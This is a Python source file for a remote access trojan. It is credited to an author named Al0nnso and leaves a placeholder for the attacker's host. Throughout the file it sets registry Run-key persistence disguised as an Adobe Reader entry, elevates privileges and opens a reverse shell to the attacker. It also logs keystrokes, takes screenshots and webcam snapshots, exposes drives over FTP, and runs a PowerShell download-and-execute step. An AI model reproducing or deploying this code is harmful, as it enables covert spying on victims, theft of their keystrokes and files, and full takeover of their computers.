import pynput
from multiprocessing import Process
from elevate import elevate
from time import sleep
import shutil
import socket, subprocess
import os
import tempfile
import pyautogui
import logging, sys,_thread
import base64
import getpass, platform
from requests import get
import geocoder
import inspect
import ctypes
import random

# Al0nnso - 2019
# Edit the last lines with your host

try:
    ip = get('https://api.ipify.org').text
except:
    ip='ERROR'
    pass
TEMPDIR = tempfile.gettempdir()
os.chdir('C:\\')
#host = 'YOUR_HOST' # Edit only the last lines
port = 443
window = ''
file='sll.exe'
website='{}/{}'.format(host,file)
geo = geocoder.ip('me')
filename = os.path.basename(sys.argv[0])
filepath = os.path.abspath(sys.argv[0])
username = getpass.getuser()
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
ftp=None
inf = "\n{}\n{}\n\n> Geo.inf\n{}\n{}\n\n> System.inf\n{}\n{}\n{}\n\n> Raw:\n{}\n".format(hostname, IPAddr, geo, geo.latlng, platform.node(), platform.system(),
                                                                platform.processor(), platform.uname())

foldername='{8CF857C2-F611-4EPC-8A88-051C46969BZA}'
temp_dir='{}\\{}'.format(TEMPDIR,foldername)

#Computador\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
#

#print(os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))) # script directory
#print(inspect.getfile(inspect.currentframe())) # script filename (usually with path)
print(os.path.abspath(sys.argv[0]))

#try:
    #os.system("powershell.exe \"IEX ((new-object net.webclient).downloadstring('IP:SERVER')\"")
    #$WebClient = New-Object System.Net.WebClient
    #$WebClient.DownloadFile(website,"{}\\{}".format(TEMPDIR,filename))
#except:
#    pass

try:
    subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"" /v AdobeReader_sample /d {}\\{}".format(temp_dir, filename))
except:
    pass
'''
try:
    if not os.path.isfile("{}\\{}".format(temp_dir, filename)):
        if not os.path.isdir(temp_dir):
            os.mkdir(temp_dir)
        shutil.copy(filepath,temp_dir)
        try:
            print("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"" /v AdobeReader_sample /d {}\\{}".format(temp_dir, filename))
            elevate(show_console=False)
            #PNULL = open(os.devnull, 'w')
            subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"" /v AdobeReader_sample /d {}\\{}".format(temp_dir, filename))
        except Exception as e:
            print('FAIL TO PERSISTENCE')
            print('ERROR: {}'.format(e))
except Exception as e:
    print("NOT PERSIST:  {}".format(e))
    pass
'''
try:
    import sys,shutil
    import winreg
    elevate(show_console=False)
    #path_arquivo=realpath(__file__)
    try:
        if not os.path.isfile("{}\\{}".format(temp_dir, filename)):
            if not os.path.isdir(temp_dir):
                os.mkdir(temp_dir)
            shutil.copy(filepath,temp_dir)
    except Exception as e:
        print('FAIL TEMP: {}'.format(e))
        pass
    else:  
        run=r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:
            aReg=winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE)
            keyd=winreg.OpenKey(aReg,run,0,winreg.KEY_SET_VALUE)
        except PermissionError:
            print("NO ADMIN")
            pass
        else:
            winreg.SetValueEx(keyd,'AdobeReader_sample',0,winreg.REG_SZ,"{}\\{}".format(temp_dir, filename))
            keyd.Close()
except Exception as e:
    print("FAIL PERSISTENCE: {}".format())

def connect(host, port):
    global geo
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        try:
            s.send('[+] Connected  {}'.format(geo.latlng).encode())
        except:
            s.send('[+] Connected\n'.encode())
        return s
    except Exception as e:
        return None


def serverFTP(server, address, disk, user, s, ip):#GOOD
    from pyftpdlib.authorizers import DummyAuthorizer
    from pyftpdlib.handlers import FTPHandler
    from pyftpdlib import servers
    print('FTP STARTING...')
    try:
        authorizer = DummyAuthorizer()
        try:
            try:
                s.send('FTP starting...: {}'.format(ip).encode())
            except:
                pass
            print('TRYING...')
            disk = '{}:\\'.format(disk.upper())
            s.send('disk: {}'.format(disk).encode())
            if user == None:
                authorizer.add_anonymous(disk)
            elif user == '/user':
                authorizer.add_user('user', '404', disk, perm="elradfmwMT")
            else:
                authorizer.add_user(user, user, disk, perm="elradfmwMT")
        except:
            authorizer.add_anonymous("\\")
        handler = FTPHandler
        handler.authorizer = authorizer
        address = ("0.0.0.0", 21)
        server = servers.FTPServer(address, FTPHandler)
        #s.send('[+] FTP server started on ftp://{}:21'.format(ip).encode())
        server.serve_forever()
    except Exception as e:
        sleep(10)
        s.send('reconecting...'.encode())
        print(e)
        serverFTP()

def commands(s):
    global TEMPDIR,host,port,ip
    try:
        while True:
            data = s.recv(8024)
            print(data.decode())
            sdata = str(data.decode()).split(" ")
            if sdata[0].lower() == '/exit':
                break
            elif sdata[0].lower() == '/exit/kill':
                exit(1)
            elif sdata[0].lower() == 'printest':
                s.send('T E S T,test,...123\n'.encode())
            elif sdata[0].lower() == 'webcam':
                WEBCAM(s, data)
            elif sdata[0].lower() == 'screenshot':
                SCREENSHOT(s, data)
            elif sdata[0].lower() == 'keylogger':
                try:
                    pkey = Process(target=KEYLOGGER,args=(data,TEMPDIR))
                    if sdata[1].lower() == 'start':
                        print('START KEYLOGGER..')
                        try:
                            pkey.terminate()
                        except:
                            pass
                        pkey.start()
                        s.send('[+] Started KEYLOGGER'.encode())
                    elif sdata[1].lower()=='stop':
                        pkey.terminate()
                        s.send('STOPED keylogger...'.encode())
                    else:
                        s.send('[?] WHAT -keylogger'.encode())
                except Exception as e:
                    s.send('WHAT: {}'.format(e).encode())
                except Exception as e:
                    s.send('[X] Fail keylogger process: {}'.format(e).encode())
            elif sdata[0].lower() == 'ip':
                s.send(str(ip).encode())
            elif sdata[0].lower() == 'persistence':
                try:
                    if sdata[1]=="random":
                        name=random.randint(100000000000000,10000000000000000000)
                    else:
                        name=sdata[1]
                    s.send("geting with name: {} ...".format(name).encode())
                    print("default")
                except:
                    name="AdobeReader_sample"
                    s.send("geting default name...".encode())
                try:
                    persistence(name)
                    s.send("[+] finish".encode())
                except:
                    s.send("[X] FAIL".encode())
            elif sdata[0].lower() == 'getlog':
                get_log(s)
            elif sdata[0].lower() == 'admin':
                if isAdmin():
                    s.send("Admin! Oh yeah!".encode())
                else:
                    s.send("Oh Bad news :(".encode())
            elif sdata[0].lower() == 'getadmin':
                s.send("OK...".encode())
                sleep(2)
                elevate()
            #elif sdata[0].lower() == 'persistence' or sdata[0].lower() == 'per' or sdata[0].lower() == '-p':
            #    temprun()
            elif sdata[0].lower()=='ftp':
                try:
                    if sdata[1].lower() == 'start':
                        ftp=None
                        server = None
                        disk = "\\"
                        address = ("0.0.0.0", 21)
                        user = None
                        ftp = Process(target=serverFTP,args=(server, address, disk, user, s, ip))
                        print('START..')
                        try:
                            if sdata[2].isalpha() and len(sdata[2])==1:
                                disk=sdata[2]
                                s.send('tryng to start on : {}'.format(disk).encode())
                        except:
                            pass
                        try:
                            ftp.terminate()
                        except:
                            pass
                        ftp.start()
                        s.send('Started on {}'.format(ip).encode())
                    elif sdata[1].lower()=='stop':
                        ftp.terminate()
                        s.send('STOPED: {}'.format(ip).encode())
                    else:
                        s.send('WHAT?'.encode())
                except Exception as e:
                    s.send('WHAT: {}'.format(e).encode())
            elif sdata[0].lower() == 'geo' or sdata[0].lower() == 'geoinfo':
                geoLocation(s)
            elif sdata[0].lower() == 'inf':
                global inf;s.send(inf.encode())
            else:
                CMD(s, data)
    except:
        error(s)



def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def get_log(s):
    try:
        file_log = '{}\\key_log.txt'.format(TEMPDIR)
        flog=open(file_log,'rb')
        s.send(flog.read())
    except:
        s.send("[X] Fail to get log".encode())


def binder(webshell,s,filename_binder,injetable):
    try:
        global TEMPDIR
        local='{}\\{}'.format(TEMPDIR,filename_binder)
        if injetable:
            os.system("powershell.exe \"IEX ((new-object net.webclient).downloadstring('{}')\"".format(webshell))
        else:
            os.system("powershell.exe \"$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile({},{})\"".format(webshell))
    except:
        try:
            s.send('[X] Fail to bind inject:{}'.format(injetable).encode())
        except:
            pass

def temprun():#NOT CONFIGURED
    try:
        if not os.path.isfile("{}\\{}".format(temp_dir, filename)):
            if not os.path.isdir(temp_dir):
                os.mkdir(temp_dir)
            shutil.copy(filepath,temp_dir)
            try:
                print("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"" /v AdobeReader_sample /d {}\\{}".format(temp_dir, filename))
                #elevate()
                #PNULL = open(os.devnull, 'w')
                subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"" /v AdobeReader_sample /d {}\\{}".format(temp_dir, filename))
            except Exception as e:
                print('FAIL TO PERSISTENCE')
                print('ERROR: {}'.format(e))
    except Exception as e:
        print("NOT PERSIST:  {}".format(e))
        pass

def persistence(name):
    subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"" /v {} /d {}\\{}".format(name,temp_dir, filename))

def on_press(key):
    try:
        logging.info(str(key).replace('\'', ''))
        print(str(key))
    except Exception as e:
        print("type_error :{}".format(e))
    # return True
def KEYLOGGER(data,TEMPDIR):
    print('key start...')
    try:
        file_log = '{}\\key_log.txt'.format(TEMPDIR)
        if not os.path.isfile(file_log):
            f=open(file_log,'wb')
            f.close()
        logging.basicConfig(filename=(file_log), level=logging.DEBUG, format='%(asctime)s: %(message)s')

        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        print("keyFAIL:{}".format(e))
        pass



def WEBCAM(s, data):#DONT WORK
    global TEMPDIR
    try:
        try:
            os.system('setx OPENCV_VIDEOIO_PRIORITY_MSMF 0')
            s.send('[+] OPENCV_VIDEOIO_PRIORITY_MSMF'.encode())
        except:
            s.send('[X] OPENCV_VIDEOIO_PRIORITY_MSMF'.encode())
        ##from ecapture import ecapture as ec
        import cv2
        c=cv2.VideoCapture(0)
        return_value,image=c.read()
        cv2.imwrite('{}\\camera.png'.format(TEMPDIR),image)
        c.release()
        #del(c)
        #cv2.destroyAllWindows()
        # sendFTP('{}\\camera.png'.format(TEMPDIR),s,True)
        # image='camera.png'
        # for i in range(0,100,1):
        #    if not os.path.isfile('camera{}.png'.format(i)):
        #        image='{}\\camera{}.png'.format(TEMPDIR,i)
        #        break
        ##ec.capture(0, False, '{}\\camera.png'.format(TEMPDIR))
        ###from VideoCapture import Device
        ###cam = Device()
        ###cam.saveSnapshot('{}\\camera.png'.format(TEMPDIR))
        
        sleep(2)
        sendFTP('{}\\camera.png'.format(TEMPDIR), s, True)
    except:
        s.send('complete/ERROR-MODULE')
        s.send('[X] Webcam_Snap ERROR')

def SCREENSHOT(s, data):#GOOD
    try:
        global TEMPDIR
        print('screenshoting...')
        pyautogui.screenshot('{}\\screenshot.png'.format(TEMPDIR))
        # s.send('capturing'.encode())
        sendFTP('{}\\screenshot.png'.format(TEMPDIR), s, True)
        # commands(s,data)
        # data=c.recv(1024).decode()
    except:
        s.send('complete/ERROR-MODULE')

def sendFTP(file, s, delFile):#GOOD
    try:
        print('unploading...')
        f = open(file, 'rb')
        i = f.read()
        while (i):
            s.send(i)
            i = f.read()
        f.close()
        sleep(1)
        s.send('complete'.encode())
        if delFile:
            os.remove(file)
        sleep(2)
        s.send('[+] Removed archive from TEMP'.encode())
        print('finish...')
    except:
        s.send('complete/ERROR-SEND'.encode())

def geoLocation(s):
    global geo
    from ipregistry import IpregistryClient
    client = IpregistryClient("tryout")  
    ipInfo = client.lookup() 
    print(geo.latlng)
    print(ipInfo)
    geoinfo='[1] cords: {}\n[2] RAW_cords: \n{}'.format(str(geo.latlng),str(ipInfo))
    s.send(geoinfo.encode())

def CMD(s, data):
    try:
        if data[:2].decode() == 'cd':
            try:
                os.chdir(data[3:].decode())
                diretorio = os.getcwd()
                s.send(diretorio.encode())
            except:
                s.send("[-] Diretorio inexistente.".encode())
        else:
            #proc = '\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x50\x6f\x70\x65\x6e\x28\x64\x61\x74\x61\x2e\x64\x65\x63\x6f\x64\x65\x28'
            #proc += '\x2e\x50\x49\x50\x45\x2c\x73\x74\x64\x65\x72\x72\x3d\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x50\x49\x50\x45\x29'
            #proc += '\x29\x2c\x20\x73\x68\x65\x6c\x6c\x3d\x54\x72\x75\x65\x2c\x20\x73\x74\x64\x69\x6e\x3d\x73\x75\x62\x70\x72\x6f'
            #proc += '\x63\x65\x73\x73\x2e\x50\x49\x50\x45\x2c\x20\x73\x74\x64\x6f\x75\x74\x3d\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73'
            proc = subprocess.Popen(data.decode(), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            Ccom = proc.stdout.read()
            Cerror = proc.stderr.read()
            ccmd = Ccom + Cerror
            if len(ccmd) > 0:
                s.send(ccmd)
            else:
                s.send(' '.encode())
    except:
        error(s)

def error(s):
    host = socket.gethostbyname('YOUR_HOST')# Put your host
    if s:
        s.close()
    main()

def main():
    while True:
        s_conect = connect(host, port)
        if s_conect:
                commands(s_conect)
        else:
            print('[-] {} Conection request in 10s...'.format(socket.gethostbyname('YOUR_HOST')))# Put your host too
            sleep(10)

s = None
print('START...')
if __name__ == '__main__':
    main()